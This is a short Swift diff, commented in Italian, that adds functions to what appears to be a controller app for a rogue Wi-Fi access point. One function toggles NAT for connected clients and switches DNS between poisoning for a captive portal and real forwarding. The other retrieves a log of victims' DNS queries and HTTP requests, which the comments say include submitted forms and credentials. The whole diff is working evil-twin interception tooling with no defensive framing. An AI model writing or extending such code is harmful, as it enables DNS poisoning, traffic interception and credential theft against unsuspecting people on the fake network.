@@ -817,4 +817,22 @@ final class TCPBridge: NSObject, ObservableObject {
         log(ok ? "portal impostato (\(b.count)B)" : "portal fallito")
         return ok
     }
+
+    // NAPT (internet per i client del rogue AP) + mode DNS: 0=poison/portal, 1=forward reale
+    func nat(_ on: Bool, dnsFwd: Bool) async -> Bool {
+        guard connected else { return false }
+        let ok = await sendAwait(0x18, payload: [on ? 1 : 0, dnsFwd ? 1 : 0], timeout: 8)?.0 == 0
+        log(ok ? "nat=\(on) dns=\(dnsFwd ? "forward" : "poison")" : "nat fallito")
+        return ok
+    }
+
+    // log traffico client: "D:qname" (domini) e "H:..." (richieste HTTP + form/credenziali)
+    func trafficLog() async -> [String] {
+        guard connected else { return [] }
+        guard let r = await sendAwait(0x19, payload: [], timeout: 8), r.0 == 0 else { return [] }
+        let csv = String(decoding: r.1, as: UTF8.self)
+        let items = csv.isEmpty ? [] : csv.components(separatedBy: "|")
+        log("traffic log: \(items.count) voci")
+        return items
+    }
 }
